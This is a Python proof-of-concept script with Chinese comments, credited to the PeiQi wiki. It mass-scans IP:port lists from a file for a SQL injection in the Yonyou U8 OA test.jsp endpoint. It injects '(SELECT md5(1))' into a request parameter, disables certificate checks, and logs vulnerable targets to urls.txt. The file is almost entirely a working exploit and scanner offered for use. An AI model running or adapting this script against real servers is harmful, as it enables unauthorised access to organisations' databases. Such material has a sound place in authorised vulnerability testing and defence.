import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

ip = []  # 用于存放存在漏洞的URL地址


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle   : 用友 U8 OA test.jsp SQL注入漏洞                           \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mFile         >>> ip.txt                             \033[0m')
    print('+------------------------------------------')


def POC_1(target_url) -> bool:
    vuln_url = target_url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        # 漏洞验证成功的条件
        if "c4ca4238a0b923820dcc509a6f75849b" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 \n[o] 响应地址: {} \033[0m".format(target_url, vuln_url))
            ip.append(vuln_url)
        else:
            print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))


if __name__ == '__main__':
    title()
    with open('ip.txt', 'r', encoding='utf-8') as f:
        g = f.read()
    a = re.findall('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}[:]\d+', g)  # 提取为IP:PORT的形式

    # 逐个验证IP.txt
    for i in a:
        if 'http' in i:
            target_url = str(i)
        else:
            target_url = 'http://' + str(i)
        print(target_url)
        core_name = POC_1(target_url)

    # 将存在漏洞的URL写入url.txt
    with open("urls.txt", "w") as f:
        for i in ip:
            if i != '':
                f.write(i + "\n")

    print(ip)  # 最终打印所有存在漏洞的IP
